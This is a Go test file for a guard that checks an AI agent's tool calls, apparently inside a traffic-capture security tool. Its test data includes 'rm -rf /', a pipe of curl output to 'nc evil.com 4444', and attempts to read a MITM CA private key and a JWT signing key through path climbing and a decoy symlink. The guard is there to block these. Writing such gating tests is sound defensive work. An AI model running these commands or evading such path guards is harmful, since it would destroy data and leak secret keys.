package guard

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

// The hard floor: an agent must never open the MITM CA private key, the capture
// index, the evidence blobs or the JWT signing key, however the path is spelled.
// Every agent runs with its CWD inside the data dir and ModeBypass, so the
// workspace HTTP gate (server/workspace.go) does not cover this.
func TestProtectedPathsBlocked(t *testing.T) {
	root := t.TempDir()
	data := filepath.Join(root, "data")
	caDir := filepath.Join(data, "traffic", "_ca")
	if err := os.MkdirAll(caDir, 0o755); err != nil {
		t.Fatal(err)
	}
	caKey := filepath.Join(caDir, "mitmproxy-ca.pem")
	if err := os.WriteFile(caKey, []byte("private"), 0o600); err != nil {
		t.Fatal(err)
	}
	jwtKey := filepath.Join(data, "jwt.key")
	if err := os.WriteFile(jwtKey, []byte("signing"), 0o600); err != nil {
		t.Fatal(err)
	}
	// A decoy symlink: `notes.txt` → the CA key. The path itself looks innocent,
	// so only symlink resolution can catch it.
	link := filepath.Join(data, "notes.txt")
	if err := os.Symlink(caKey, link); err != nil {
		t.Fatal(err)
	}
	SetProtectedPaths([]string{
		filepath.Join(data, "traffic"),
		filepath.Join(data, "evidence"),
		jwtKey,
	})
	t.Cleanup(func() { protectedPaths.Store(nil) })

	g := New()
	blocked := func(tool string, input any) bool {
		raw, _ := json.Marshal(input)
		b, _, _ := g.Hooks().PreToolUse(context.Background(), tool, raw)
		return b
	}

	// Shell reaches: relative climb, absolute, and a run-dir-relative case that
	// cannot escape (allowed).
	for _, cmd := range []string{
		"cat traffic/_ca/mitmproxy-ca.pem",
		"cat ../../traffic/_ca/mitmproxy-ca.pem",
		"cat " + caKey,
		"ls traffic/_index",
		"sqlite3 traffic/_index/index.sqlite '.tables'",
		"cp jwt.key /tmp/x",
		"cat evidence/blobs/aa/bb.bin",
		"cat ../../traffic/_blobs/aa/bb.bin",
	} {
		if !blocked("Bash", map[string]string{"command": cmd}) {
			t.Errorf("expected block for shell command %q", cmd)
		}
	}
	// A target URL that merely contains the word traffic is not a local path.
	for _, cmd := range []string{
		"curl https://target.example/traffic/_ca",
		"grep -rn evidence .",
		"ls -la",
		"mkdir traffic && echo x > traffic/notes.md",
	} {
		if blocked("Bash", map[string]string{"command": cmd}) {
			t.Errorf("expected allow for shell command %q", cmd)
		}
	}
	// Structured file tools: declared path fields are checked, plus symlinks.
	for _, in := range []map[string]any{
		{"file_path": caKey},
		{"file_path": jwtKey},
		{"path": "../../traffic/_ca/mitmproxy-ca.pem"},
		{"file_path": link},
	} {
		if !blocked("Read", in) {
			t.Errorf("expected block for Read %v", in)
		}
	}
	if blocked("Read", map[string]any{"file_path": filepath.Join(data, "report.md")}) {
		t.Error("ordinary workspace file should not be blocked")
	}
	// Monitor spawns a background shell command; it must be inspected exactly like
	// Bash (it used to be invisible to both the audit log and the gate).
	if !blocked("Monitor", map[string]any{"command": "tail -f ../../traffic/_ca/mitmproxy-ca.pem"}) {
		t.Error("Monitor running a protected-path command should be blocked")
	}
	if blocked("Monitor", map[string]any{"command": "tail -f app.log"}) {
		t.Error("ordinary Monitor command should not be blocked")
	}
	// Deferred tools (every MCP tool, deferred custom tools) run through
	// ExecuteExtraTool; the inner call is what executes, so it must be inspected.
	if !blocked("ExecuteExtraTool", map[string]any{
		"tool_name": "Read",
		"params":    map[string]any{"file_path": jwtKey},
	}) {
		t.Error("deferred execute of a protected read should be blocked")
	}
	if blocked("ExecuteExtraTool", map[string]any{
		"tool_name": "mcp__browser__navigate",
		"params":    map[string]any{"url": "https://target.example/"},
	}) {
		t.Error("deferred execute of an ordinary tool should not be blocked")
	}
	// The block is recorded in the audit log as a block, not as an allow.
	var seen bool
	for _, a := range g.Audit() {
		if a.Action == "block" {
			seen = true
		}
	}
	if !seen {
		t.Error("blocked access should be recorded in the audit log")
	}
}
